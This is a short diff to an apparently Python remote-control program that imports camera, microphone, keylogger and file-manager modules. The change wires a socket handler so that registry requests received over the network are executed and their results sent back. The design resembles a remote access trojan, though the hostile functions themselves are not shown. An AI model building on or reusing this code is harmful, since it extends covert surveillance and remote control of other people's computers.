@@ -2,7 +2,7 @@ from camera import *
 from microphone import *
 from keylogger import *
 from fileManager import *
-
+from regedit import *
 
 async def open_file_manager(GUI, writer, reader):
     # 这里放具体的操作
@@ -20,9 +20,9 @@ async def open_reg_manager(GUI, writer, reader):
     while (1):
         response = await reader.read(1024)
         if (response):
-            operation = "Im reg manager!"
-            writer.write(operation.encode())
-            await writer.drain()
+            result = handle_registry_request(response.decode())
+            writer.write(result.encode())  
+            await writer.drain()  
         else:
             writer.close()
             return
